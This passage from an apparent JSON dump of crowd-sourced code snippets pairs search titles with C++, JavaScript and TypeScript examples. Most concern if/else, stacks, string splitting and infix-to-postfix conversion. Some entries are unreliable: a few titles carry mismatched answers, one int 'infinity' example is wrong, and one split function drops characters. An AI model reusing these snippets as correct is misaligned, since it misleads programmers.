    "description": "   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \nif (condition) {     // block of code if condition is true } else {     // block of code if condition is false }\n// Program to check whether an integer is positive or negative // This program considers 0 as a positive number  #include <iostream> using namespace std;  int main() {      int number;      cout << \"Enter an integer: \";     cin >> number;     if (number >= 0) {         cout << \"You entered a positive integer: \" << number << endl;     }     else {         cout << \"You entered a negative integer: \" << number << endl;     }     cout << \"This line is always printed.\";     return 0; }\nif(condizione){     //Istruzione } else{     //Istruzione }\n#include<iostream> using namespace std; int main(){ \tint eta;  \tcout<<\"Ciao Utente inserisci la tua eta'! \"<<\"\\n\"; \tcin>>eta; \tif(eta >= 18){ \t\tcout<<\"Benvenuto al cinema!\"; \t} }\n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2729,
    "keyword": null,
    "link": null,
    "title": " if else in C++",
    "description": "   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \n//1 if(condition) {    statement(s); } else {    statement(s); } //2 (condition) ? (true_statement) : (false_statement)\n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2730,
    "keyword": null,
    "link": null,
    "title": " if else javascript",
    "description": "if (typeof myVar === 'string') { /* code */ };\nIf - Else Statements if (condition) { // what to do if condition is met } else { // what to do if condition is not met } \nvar i; for (i = 0; i < 10 ; i++) {   //do something }\nif (condition1) {   //  block of code to be executed if condition1 is true  } else if (condition2) {   //  block of code to be executed if the condition1 is false and    //  condition2 is true } else {   //  block of code to be executed if the condition1 is false and    //  condition2 is false  }\nif (time < 10) {   greeting = \"Good morning\"; } else if (time < 20) {   greeting = \"Good day\"; } else {   greeting = \"Good evening\"; }\nif (expression) {    Statement(s) to be executed if expression is true } else {    Statement(s) to be executed if expression is false } \n",
    "reg_date": "2021-10-12T11:41:26.000Z"
  },
  {
    "id": 2731,
    "keyword": null,
    "link": null,
    "title": " if else program in c ++",
    "description": "if (condition) {     // block of code if condition is true } else {     // block of code if condition is false }\n// Program to check whether an integer is positive or negative // This program considers 0 as a positive number  #include <iostream> using namespace std;  int main() {      int number;      cout << \"Enter an integer: \";     cin >> number;     if (number >= 0) {         cout << \"You entered a positive integer: \" << number << endl;     }     else {         cout << \"You entered a negative integer: \" << number << endl;     }     cout << \"This line is always printed.\";     return 0; }\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2732,
    "keyword": null,
    "link": null,
    "title": " if not c++",
    "description": "#include <iostream> using namespace std;  bool state = false;  if (state != true) { //Boolean is false.   cout << \"No\"; } else { //Boolean is true   cout << \"Yes\"; }\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2733,
    "keyword": null,
    "link": null,
    "title": " if not defined c++",
    "description": "#ifndef DATASPEC_INCLUDE_H #define DATASPEC_INCLUDE_H  \t//code  #endif\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2734,
    "keyword": null,
    "link": null,
    "title": " if programming c++",
    "description": "if (condition) {     // block of code if condition is true } else {     // block of code if condition is false }\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2735,
    "keyword": null,
    "link": null,
    "title": " if statement C++",
    "description": "if (20 > 18) {   cout << \"20 is greater than 18\"; }\n   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \nif (condition) {     // block of code if condition is true } else {     // block of code if condition is false }\n#include<iostream> using namespace std;  int main() {     int grade;      cin >> grade;      if( grade >= 60 )         cout << \"You Pass!\" << endl;     else         cout << \"You Fail...\" << endl;      return 0; } \n// Program to check whether an integer is positive or negative // This program considers 0 as a positive number  #include <iostream> using namespace std;  int main() {      int number;      cout << \"Enter an integer: \";     cin >> number;     if (number >= 0) {         cout << \"You entered a positive integer: \" << number << endl;     }     else {         cout << \"You entered a negative integer: \" << number << endl;     }     cout << \"This line is always printed.\";     return 0; }\nif (condition) { \t// block of code } else if (condition) { \t// block of code } else { \t// block of code }\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2736,
    "keyword": null,
    "link": null,
    "title": " if vector contains value c++",
    "description": "#include <algorithm>  if(std::find(v.begin(), v.end(), x) != v.end()) {     /* v contains x */ } else {     /* v does not contain x */ }\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2737,
    "keyword": null,
    "link": null,
    "title": " if vector is empty c++",
    "description": "v.empty() // returns true if vector v is empty\nreturn vector<int>(); //or return{};\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2738,
    "keyword": null,
    "link": null,
    "title": " ifstream >> operator",
    "description": "istream& operator>> (bool& val); istream& operator>> (short& val); istream& operator>> (unsigned short& val); istream& operator>> (int& val); istream& operator>> (unsigned int& val); istream& operator>> (long& val); istream& operator>> (unsigned long& val); istream& operator>> (long long& val); istream& operator>> (unsigned long long& val); istream& operator>> (float& val); istream& operator>> (double& val); istream& operator>> (long double& val); istream& operator>> (void*& val); \n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2739,
    "keyword": null,
    "link": null,
    "title": " ifstream file (“code2.txt”); dev C++",
    "description": "ifstream file (&ldquo;code2.txt&rdquo;); \n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2740,
    "keyword": null,
    "link": null,
    "title": " il2cpp stuck unity",
    "description": "if you try to build to android and its stuck on \"IL2CPP\" or \"Gradle\"      so make sure the game file saving on a place without letters on other language    or special letters like \"\"~`'\\/., etc\n//save the folder on a place without words in other languages and no special keys\nIf webGL build gets stuck here...    Windows Key + R Type in \"regedit\"    Do this while it is stuck and it should start working again.\n",
    "reg_date": "2021-10-12T11:41:27.000Z"
  },
  {
    "id": 2741,
    "keyword": null,
    "link": null,
    "title": " il2cpp unity stuck c#",
    "description": "//save the folder on a place without words in other languages and no special keys\n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2742,
    "keyword": null,
    "link": null,
    "title": " implement a linked list in typescript",
    "description": "\tclass LinkedListItem { \t\tvalue: any; \t\tnext: LinkedListItem;  \t\tconstructor(val) { \t\t\tthis.value = val; \t\t\tthis.next = null; \t\t} \t} \n1 2 3 4 5 6 \tclass LinkedList { \t\tprivate head: LinkedListItem; \t\tconstructor(item: LinkedListItem) { \t\t\tthis.head = item; \t\t} \t} \n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2743,
    "keyword": null,
    "link": null,
    "title": " implementation of stack using array in c, user input",
    "description": "#include <iostream> using namespace std; int stack[100], n=100, top=-1; void push(int val) {    if(top>=n-1)    cout<<\"Stack Overflow\"<<endl;    else {       top++;       stack[top]=val;    } } void pop() {    if(top<=-1)    cout<<\"Stack Underflow\"<<endl;    else {       cout<<\"The popped element is \"<< stack[top] <<endl;       top--;    } } void display() {    if(top>=0) {       cout<<\"Stack elements are:\";       for(int i=top; i>=0; i--)       cout<<stack[i]<<\" \";       cout<<endl;    } else    cout<<\"Stack is empty\"; } int main() {    int ch, val;    cout<<\"1) Push in stack\"<<endl;    cout<<\"2) Pop from stack\"<<endl;    cout<<\"3) Display stack\"<<endl;    cout<<\"4) Exit\"<<endl;    do {       cout<<\"Enter choice: \"<<endl;       cin>>ch;       switch(ch) {          case 1: {             cout<<\"Enter value to be pushed:\"<<endl;             cin>>val;             push(val);             break;          }          case 2: {             pop();             break;          }          case 3: {             display();             break;          }          case 4: {             cout<<\"Exit\"<<endl;             break;          }          default: {             cout<<\"Invalid Choice\"<<endl;          }       }    }while(ch!=4);    return 0; }\n1 2 8 9 10 20 8 11 21 28\n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2744,
    "keyword": null,
    "link": null,
    "title": " implementing a scrabble in C++",
    "description": "//board.cpp #include \"board.h\"   CBoard::CBoard() { xmax = ymax = 15; firstword = FALSE; //create the initial tile set and put them in the tilebag list char tile_letters[26] = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}; int numtiles[26] = {9, 2, 2, 4, 12, 2, 3, 2, 9, 1, 1, 4, 2, 6, 8, 2, 1, 6, 4, 6, 4, 2, 2, 1, 2, 1};   int i; //outer loop counter int j; //inner loop counter for(i=0;i<26;i++) { //for each letter for(j=0;j<numtiles[i];j++) { //make tile j times tilebag.AddHead(new CTile(tile_letters[i])); } } //special case for blanks //makes 2 blank tiles tilebag.AddHead(new CTile()); tilebag.AddHead(new CTile());   //set the squares array to NULL for (i=0;i<15;i++) { for (j=0;j<15;j++) { squares[i][j] = NULL; } }   } //returns NULL if there are no tiles left in bag CObject* CBoard::GetRandomTile() { CObject *tmp; POSITION pos; srand(time(NULL));//used to when getting a random number between 0 and number elements in tilebag int limit = tilebag.GetCount(); //limit++; //evil bug of random crashies = squashed! int random; //special cases where random breaks if (limit == 0) //fix return NULL;   if (limit == 1) { pos = tilebag.FindIndex(0); tmp = tilebag.GetAt(pos); tilebag.RemoveAt(pos); return tmp; } //////////////////////////////////   random = rand()%limit; //the general random workies case if( ( pos = tilebag.FindIndex( random )) != NULL ) {   tmp = tilebag.GetAt(pos); tilebag.RemoveAt(pos); }  else { tmp = NULL; }   return tmp; } //returns a copy of the tile at specified position (used in drawing) CObject* CBoard::GetBoardTile(int x, int y) { return squares[x][y]; } /////////////////////////// // polymorphism at work :)  ////////////////////////// //return a tile to the tilebag (swapping) void CBoard::AddTile(CObject *tile) { tilebag.AddTail(tile); } //add tile to a square[x][y] void CBoard::AddTile(CObject *tile, int x, int y) {   squares[x][y] = tile; } /////////////////////////// // checks a squares index position to see if tile is there bool CBoard::IsEmpty(int x, int y) {   //make sure player score functions dont request tiles out of board if (x < 0 || x >= xmax || y < 0 || y >= ymax) return TRUE;   if (squares[x][y] == NULL) { return TRUE; } else { return FALSE; } } //returns value of tile at position int CBoard::GetScore(int x, int y) { CObject *object; CTile *tile; //make sure player score functions dont request tiles out of board if (x < 0 || x >= xmax || y < 0 || y >= ymax) return 0; if (squares[x][y] == NULL) { return 0; } else { //read out tile->value object = squares[x][y]; tile = (CTile *)object; return tile->GetValue(); }   } CBoard::~CBoard() { //traverse squares and tilebag to delete tiles CObject *object; CTile *tile; POSITION pos; int i,j; //remove tiles in the tilebag for( pos = tilebag.GetHeadPosition(); pos != NULL; ) {    object = tilebag.GetNext(pos); tile = (CTile*) object;   delete tile; } //remove tiles in squares[][] for (i=0;i<15;i++) { for (j=0;j<15;j++) { object = squares[i][j] = NULL; tile = (CTile*) object; delete tile;  } }   } #ifndef BOARD_HEADER #define BOARD_HEADER #include \"tile.h\" #include <afxcoll.h>   class CBoard { public:    bool firstword; // flag to give first player double score    CBoard(); CObject* GetRandomTile(); //from tilebag CObject* GetBoardTile(int x, int y); //returns copy of a tile at position (for drawing) void AddTile(CObject *tile); // add tile to tilebag (swaps) void AddTile(CObject *tile, int x, int y); // add tile to squares   bool IsEmpty(int x, int y); // check if squares[x][y] exists int GetScore(int x, int y); //checks squares position for tile and returns score or 0 if no tile   ~CBoard (); private:   int xmax; int ymax;    /*  Why 2D array instead of CObList, you might ask. Here are some reasons   tiles dont have to store x,y you dont have to traverse entire list to check if a given x,y is empty it is a more logical representation of real life board data */  CObject *squares[15][15]; CObList tilebag;    };   #endif // BOARD_HEADER\n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2745,
    "keyword": null,
    "link": null,
    "title": " implementing split function in c++",
    "description": "void tokenize(string &str, char delim, vector<string> &out) { \tsize_t start; \tsize_t end = 0;  \twhile ((start = str.find_first_not_of(delim, end)) != string::npos) \t{ \t\tend = str.find(delim, start); \t\tout.push_back(str.substr(start, end - start)); \t} }  int main() {     string s=\"a;b;c\";     char d=';';     vector<string> a;     tokenize(s,d,a);     for(auto it:a)  cout<<it<<\" \";      return 0; }\n// splits a std::string into vector<string> at a delimiter vector<string> split(string x, char delim = ' ') {     x += delim; //includes a delimiter at the end so last word is also read     vector<string> splitted;     string temp = \"\";     for (int i = 0; i < x.length(); i++)     {         if (x[i] == delim)         {             splitted.push_back(temp); //store words in \"splitted\" vector             temp = \"\";             i++;         }         temp += x[i];     }     return splitted; }\n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2746,
    "keyword": null,
    "link": null,
    "title": " implemetation of priority queue in c++",
    "description": "// Implementation of priority_queue in c++  //queue with elements in decreasing order priority_queue<int> pq;  // queue with elements in increasing order  using compare function inside declaration priority_queue <int, vector<int>, greater<int> > pq;  //priority_queue of type pair<int, int> #define pp pair<int, int> priority_queue <pp, vector<pp>, greater<pp> > pq; \n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2747,
    "keyword": null,
    "link": null,
    "title": " import matrix from excel to matlab",
    "description": "name = input(\"file Name: \"); #wrong. use single cottation name = input('file Name: '); #correct\n",
    "reg_date": "2021-10-12T11:41:28.000Z"
  },
  {
    "id": 2748,
    "keyword": null,
    "link": null,
    "title": " in c++ ++ how to write if without if",
    "description": "(expression 1) ? expression 2 : expression 3 ---->If expression 1 is evaluates to true, then the expression 2 is evaluated else then the expression 3 is evaluated. Example :   int s = (20 >= 2) ? 30 : 40;    cout << s ;  //prints 30\n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2749,
    "keyword": null,
    "link": null,
    "title": " in c, is class uppercase or lowercase",
    "description": "class /*class name here*/ {     /* inser all the things you do in a class   here because you can and that is what you    do*/    }\n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2750,
    "keyword": null,
    "link": null,
    "title": " inbuilt function for bin to dec in c++",
    "description": "#include <bits/stdc++.h> using namespace std;  int main(void){     bitset<8> bits(\"1000\");     int ab = bits.to_ulong();     cout << ab << \"\\n\";          return 0; }\n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2751,
    "keyword": null,
    "link": null,
    "title": " include a file in a directory cpp",
    "description": "#include \"../../Header/class1.h\"\n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2752,
    "keyword": null,
    "link": null,
    "title": " include all libraries in c++",
    "description": "#include<bits/stdc++.h>\n#include <bits/stdc++.h> //to include all of the c++ standard librarys at once\n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2753,
    "keyword": null,
    "link": null,
    "title": " include cpp",
    "description": "#include <iostream> #include \"foop.h\"  int main(int argc, char *argv[]) { int x=42; std::cout << x <<std::endl; std::cout << foo(x) << std::endl; return 0; } \n#include <iostream>  // Searches iostream in Standard C++ Header files but not in the Current file's folder #include \"myiostream.h\" // Searcher myiostream.h in the Current file's folder and also the Standard Header files\n#include \"enter_name_here.cpp\"  //Make sure the files are in the same directory. \n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2754,
    "keyword": null,
    "link": null,
    "title": " include guard c++",
    "description": "#ifndef PHYSICS_H #define PHYSICS_H  #include \"GameObject.h\" #include <list>   class Physics { private:     double gravity;     list<GameObject*> objects;     list<GameObject*>::iterator i; public:     Physics(void);     void ApplyPhysics(GameObject*);     void UpdatePhysics(int);     bool RectangleIntersect(SDL_Rect, SDL_Rect);     Vector2X CheckCollisions(Vector2X, GameObject*); };  #endif // PHYSICS_H \n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2755,
    "keyword": null,
    "link": null,
    "title": " include pdf file in latex",
    "description": "\\usepackage{pdfpages}  %To include all the pages in the PDF file: %[pages=-] includes the whole file, range can be defined by [pages= 2-6] \\includepdf[pages=-]{myfile.pdf}  %To include just the first page of a PDF: \\includepdf[pages={1}]{myfile.pdf}\n\\includepdf[pages=-,pagecommand={},width=\\textwidth]{file.pdf} \\includepdf[pages=-,fitpaper]{file.pdf}\n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2756,
    "keyword": null,
    "link": null,
    "title": " include spaces while reading strings in cpp",
    "description": "Using getline() will help you. Example:   int main() {    std::string name, title;     std::cout << \"Enter your name: \"; //Name: Robert De Niro    std::getline(std::cin, name);     std::cout << \"Enter your favourite movie: \"; // title: The Irishman    std::getline(std::cin, title);     std::cout << name << \"'s favourite movie is \" << title; } \n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2757,
    "keyword": null,
    "link": null,
    "title": " including cpp header file in c++",
    "description": "#include \"enter_name_here.cpp\"  //Make sure the files are in the same directory. \n",
    "reg_date": "2021-10-12T11:41:29.000Z"
  },
  {
    "id": 2758,
    "keyword": null,
    "link": null,
    "title": " inconsequential meaning",
    "description": "std::cout \n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2759,
    "keyword": null,
    "link": null,
    "title": " increase the speed of cin and cout in c++",
    "description": "#include <iostream>  int main(int argc, char **argv) {    int parity = 0;   int x; //you can use scanf , printf alternatively for speed   std::ios::sync_with_stdio(false);// this increases the speed of i/o    while (std::cin >> x)     parity ^= x;   std::cout << parity << std::endl;    return 0; }\n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2760,
    "keyword": null,
    "link": null,
    "title": " increment c++",
    "description": "int main(){   int i = 0;   cout << i << endl; //Outputs 0   i++; //Now i is 0 + 1   cout << i << endl; // Outputs 1   return 0; }\n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2761,
    "keyword": null,
    "link": null,
    "title": " index from iterator c++",
    "description": "int index = it - v.begin()    // \"it\" is iterator and v is a vector.\n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2762,
    "keyword": null,
    "link": null,
    "title": " index string c++",
    "description": "",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2763,
    "keyword": null,
    "link": null,
    "title": " indexing strings in c++",
    "description": "#include <string> #include <iostream>  int main(){   //index string by using brackets []   std::string string = \"Hello, World!\";   //assign variable to string index   char stringindex = string[2];    }\n// string::operator[] #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for (int i=0; i<str.length(); ++i)   {     std::cout << str[i];   }   return 0; }\n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2764,
    "keyword": null,
    "link": null,
    "title": " infinite loop c++",
    "description": "for (;;) {} while(true) {}  while(1) {}  do {} while(true)   do {} while(1)  \n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2765,
    "keyword": null,
    "link": null,
    "title": " infinity c++",
    "description": "#include <limits>  // ...  int a = std::numeric_limits<int>::max();\n#include <limits>  // ...  int a = std::numeric_limits<int>::infinity();\n",
    "reg_date": "2021-10-12T11:41:30.000Z"
  },
  {
    "id": 2766,
    "keyword": null,
    "link": null,
    "title": " infix to postfix conversion",
    "description": "Best Solution ------------------------------------------------------------------- #include<bits/stdc++.h> using namespace std;  int prec(char c) {     if(c == '^') {         return 3;     }     else if(c == '*' || c == '/') {         return 2;     }     else if(c == '+' || c =='-') {         return 1;     }     else {         return -1;     } }  string infixToPostfix(string s) {     stack<char> st;     string res;      for (int i = 0; i < s.length(); i++)     {         if((s[i] >= 'a' && s[i] <= 'z') || (s[i] >= 'A' && s[i] <= 'Z')) {             res += s[i];         }         else if(s[i] == '(') {             st.push(s[i]);         }         else if(s[i] == ')') {             while (!st.empty() && st.top() != '(')             {                 res += st.top();                 st.pop();             }             if(!st.empty()) {                 st.pop(); // Popping '(' here             }         }         else {             while (!st.empty() && prec(st.top()) >= prec(s[i]))             {                 res += st.top();                 st.pop();             }             st.push(s[i]);         }     }          while (!st.empty())     {        res += st.top();        st.pop();     }          return res; }  int main() {     string exp = \"a+b*(c^d-e)^(f+g*h)-i\";     cout<<infixToPostfix(exp);     return 0; }\nBegin    initially push some special character say # into the stack    for each character ch from infix expression, do       if ch is alphanumeric character, then          add ch to postfix expression       else if ch = opening parenthesis (, then          push ( into stack       else if ch = ^, then            //exponential operator of higher precedence          push ^ into the stack       else if ch = closing parenthesis ), then          while stack is not empty and stack top &ne; (,             do pop and add item from stack to postfix expression          done           pop ( also from the stack       else          while stack is not empty AND precedence of ch <= precedence of stack top element, do             pop and add into postfix expression          done           push the newly coming character.    done     while the stack contains some remaining characters, do       pop and add to the postfix expression    done    return postfix End\n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2767,
    "keyword": null,
    "link": null,
    "title": " infix to postfix conversion c++",
    "description": "/*https://github.com/Sudhanshu1304/Stack-Application*/  #include <iostream> #include<string> using namespace std;    class Stack{   private:       char A[5];     int Size;  public:     int top;     Stack(){          top=-1;         Size=sizeof(A)/sizeof(char);      }        bool IsFull(){          if(top==Size-1){             return true;         }         else{             return false;         }     }      bool IsEmpty(){          if(top==-1){             return true;         }         else{             return false;         }     }      char peek(){          return A[top];     }      void Push(char val){          if (IsFull()==false){             top++;             A[top]=val;         }         else{             cout<<\"\\nThe Stack is Full\"<<endl;         }     }      char Pop(){          if(IsEmpty()==false){             char temp=A[top];             A[top]='0';             top--;             return temp;         }         else{             return '-1';         }      }      void Show_Stack(){           for(int i=0;i<top+1;i++){             cout<<A[i];         }       }  };   int Search(char A){       string CHAR[]={\"([\",\"{)\",\"]}\",\"+-\",\"*/\",\"^$\"};     int Size=(sizeof(CHAR)/sizeof(string));      for(int i=0;i<Size;i++){          if(A==CHAR[i][0]){                 if(i+i>=6){                     return i+i;                 }                 else{                     return i+i+0;                 }          }         else if(CHAR[i][1]==A){              if(i+i>=6){                     return i+i;                 }                 else{                     return i+i+1;                 }         }     }     return -1;  }     void Display(char ch,string vari, Stack &s){      int Size=s.top+1;       cout<<\"\\n   \"<<ch<<\"           \";     s.Show_Stack();     for(int i=0;i<10-Size;i++){         cout<<\" \";     }     cout<<vari<<endl;  }   int main(){      Stack STACK;     char temp;     string exp;//\"A+B*C\";     cout<<\"Enter Your Expression :\";     cin>>exp;      string out=\"\";     cout<<\"\\n\\nExpression   Stack   Postfix\\n\"<<endl;     for(int i=0;i<exp.size();i++){          temp=exp[i];          int ab=Search(temp);          if (ab!=-1){              /* If We ENCOUNTER CLOSING BRACKETS*/             if(ab<=5 && ab>=3){                    while(Search(STACK.peek())>2){                     char val=STACK.Pop();                         out=out+val;                      Display(temp,out,STACK);                 }                 STACK.Pop();                 Display(temp,out,STACK);                 }             /* Search Precedence*/             else{                 if (Search(temp)>=0 && Search(temp)<=2){                     STACK.Push(temp);                     Display(temp,out,STACK);                 }                  /* If TOP < Temp */                  else if(Search(STACK.peek())<ab){                          STACK.Push(temp);                         Display(temp,out,STACK);                 }                 else{                     /* if STACK= +,* and temp= + then we have to remove two times */                       while(Search(STACK.peek())>=ab){                          char val=STACK.Pop();                             out=out+val;                         Display(temp,out,STACK);                     }                     STACK.Push(temp);                     Display(temp,out,STACK);                 }             }         }         /* If an Alphabet */         else{              out=out+temp;             Display(temp,out,STACK);              }       }     while(STACK.IsEmpty()==false){          char val=STACK.Pop();              out=out+val;         Display(temp,out,STACK);      }     cout<<\"\\n\\nFINAL STRING : \"<<out<<endl;   }\nBest Solution ------------------------------------------------------------------- #include<bits/stdc++.h> using namespace std;  int prec(char c) {     if(c == '^') {         return 3;     }     else if(c == '*' || c == '/') {         return 2;     }     else if(c == '+' || c =='-') {         return 1;     }     else {         return -1;     } }  string infixToPostfix(string s) {     stack<char> st;     string res;      for (int i = 0; i < s.length(); i++)     {         if((s[i] >= 'a' && s[i] <= 'z') || (s[i] >= 'A' && s[i] <= 'Z')) {             res += s[i];         }         else if(s[i] == '(') {             st.push(s[i]);         }         else if(s[i] == ')') {             while (!st.empty() && st.top() != '(')             {                 res += st.top();                 st.pop();             }             if(!st.empty()) {                 st.pop(); // Popping '(' here             }         }         else {             while (!st.empty() && prec(st.top()) >= prec(s[i]))             {                 res += st.top();                 st.pop();             }             st.push(s[i]);         }     }          while (!st.empty())     {        res += st.top();        st.pop();     }          return res; }  int main() {     string exp = \"a+b*(c^d-e)^(f+g*h)-i\";     cout<<infixToPostfix(exp);     return 0; }\n//Easiet way to solve infix to postfix expression bool isOperator(char c) { \tif(c=='+'||c=='-'||c=='*'||c=='/'||c=='^') \t{ \t\treturn true; \t} \telse \t{ \t\treturn false; \t} }  int precedence(char c)  {      if(c == '^')      return 3;      else if(c == '*' || c == '/')      return 2;      else if(c == '+' || c == '-')      return 1;      else     return -1;  }   string InfixToPostfix(stack<char> s, string infix) { \tstring postfix; \tfor(int i=0;i<infix.length();i++) \t{ \t\tif((infix[i] >= 'a' && infix[i] <= 'z') \t\t||(infix[i] >= 'A' && infix[i] <= 'Z')) \t\t{ \t\t\tpostfix+=infix[i]; \t\t} \t\telse if(infix[i] == '(') \t\t{ \t\t\ts.push(infix[i]); \t\t} \t\telse if(infix[i] == ')') \t\t{ \t\t\twhile((s.top()!='(') && (!s.empty())) \t\t\t{ \t\t\t\tchar temp=s.top(); \t\t\t\tpostfix+=temp; \t\t\t\ts.pop(); \t\t\t} \t\t\tif(s.top()=='(') \t\t\t{ \t\t\t\ts.pop(); \t\t\t} \t\t} \t\telse if(isOperator(infix[i])) \t\t{ \t\t\tif(s.empty()) \t\t\t{ \t\t\t\ts.push(infix[i]); \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tif(precedence(infix[i])>precedence(s.top())) \t\t\t\t{ \t\t\t\t\ts.push(infix[i]); \t\t\t\t}\t \t\t\t\telse if((precedence(infix[i])==precedence(s.top()))&&(infix[i]=='^')) \t\t\t\t{ \t\t\t\t\ts.push(infix[i]); \t\t\t\t} \t\t\t\telse \t\t\t\t{ \t\t\t\t\twhile((!s.empty())&&( precedence(infix[i])<=precedence(s.top()))) \t\t\t\t\t{ \t\t\t\t\t\tpostfix+=s.top(); \t\t\t\t\t\ts.pop(); \t\t\t\t\t} \t\t\t\t\ts.push(infix[i]); \t\t\t\t} \t\t\t} \t\t} \t} \twhile(!s.empty()) \t{ \t\tpostfix+=s.top(); \t\ts.pop(); \t} \t \treturn postfix; }  int main()  {      \tstring infix_exp, postfix_exp;   \tcout<<\"Enter a Infix Expression :\"<<endl;   \tcin>>infix_exp;   \tstack <char> stack; \tcout<<\"INFIX EXPRESSION: \"<<infix_exp<<endl;   \tpostfix_exp = InfixToPostfix(stack, infix_exp);   \tcout<<endl<<\"POSTFIX EXPRESSION: \"<<postfix_exp; \t   \treturn 0; }\nBegin    initially push some special character say # into the stack    for each character ch from infix expression, do       if ch is alphanumeric character, then          add ch to postfix expression       else if ch = opening parenthesis (, then          push ( into stack       else if ch = ^, then            //exponential operator of higher precedence          push ^ into the stack       else if ch = closing parenthesis ), then          while stack is not empty and stack top &ne; (,             do pop and add item from stack to postfix expression          done           pop ( also from the stack       else          while stack is not empty AND precedence of ch <= precedence of stack top element, do             pop and add into postfix expression          done           push the newly coming character.    done     while the stack contains some remaining characters, do       pop and add to the postfix expression    done    return postfix End\n",
    "reg_date": "2021-10-12T11:41:31.000Z"
  },
  {
    "id": 2768,
    "keyword": null,
    "link": null,
    "title": " infix to postfix program in c++",
    "description": "/*https://github.com/Sudhanshu1304/Stack-Application*/  #include <iostream> #include<string> using namespace std;    class Stack{   private:       char A[5];     int Size;  public:     int top;     Stack(){          top=-1;         Size=sizeof(A)/sizeof(char);      }        bool IsFull(){          if(top==Size-1){             return true;         }         else{             return false;         }     }      bool IsEmpty(){          if(top==-1){             return true;         }         else{             return false;         }     }      char peek(){          return A[top];     }      void Push(char val){          if (IsFull()==false){             top++;             A[top]=val;         }         else{             cout<<\"\\nThe Stack is Full\"<<endl;         }     }      char Pop(){          if(IsEmpty()==false){             char temp=A[top];             A[top]='0';             top--;             return temp;         }         else{             return '-1';         }      }      void Show_Stack(){           for(int i=0;i<top+1;i++){             cout<<A[i];         }       }  };   int Search(char A){       string CHAR[]={\"([\",\"{)\",\"]}\",\"+-\",\"*/\",\"^$\"};     int Size=(sizeof(CHAR)/sizeof(string));      for(int i=0;i<Size;i++){          if(A==CHAR[i][0]){                 if(i+i>=6){                     return i+i;                 }                 else{                     return i+i+0;                 }          }         else if(CHAR[i][1]==A){              if(i+i>=6){                     return i+i;                 }                 else{                     return i+i+1;                 }         }     }     return -1;  }     void Display(char ch,string vari, Stack &s){      int Size=s.top+1;       cout<<\"\\n   \"<<ch<<\"           \";     s.Show_Stack();     for(int i=0;i<10-Size;i++){         cout<<\" \";     }     cout<<vari<<endl;  }   int main(){      Stack STACK;     char temp;     string exp;//\"A+B*C\";     cout<<\"Enter Your Expression :\";     cin>>exp;      string out=\"\";     cout<<\"\\n\\nExpression   Stack   Postfix\\n\"<<endl;     for(int i=0;i<exp.size();i++){          temp=exp[i];          int ab=Search(temp);          if (ab!=-1){              /* If We ENCOUNTER CLOSING BRACKETS*/             if(ab<=5 && ab>=3){                    while(Search(STACK.peek())>2){                     char val=STACK.Pop();                         out=out+val;                      Display(temp,out,STACK);                 }                 STACK.Pop();                 Display(temp,out,STACK);                 }             /* Search Precedence*/             else{                 if (Search(temp)>=0 && Search(temp)<=2){                     STACK.Push(temp);                     Display(temp,out,STACK);                 }                  /* If TOP < Temp */                  else if(Search(STACK.peek())<ab){                          STACK.Push(temp);                         Display(temp,out,STACK);                 }                 else{                     /* if STACK= +,* and temp= + then we have to remove two times */                       while(Search(STACK.peek())>=ab){                          char val=STACK.Pop();                             out=out+val;                         Display(temp,out,STACK);                     }                     STACK.Push(temp);                     Display(temp,out,STACK);                 }             }         }         /* If an Alphabet */         else{              out=out+temp;             Display(temp,out,STACK);              }       }     while(STACK.IsEmpty()==false){          char 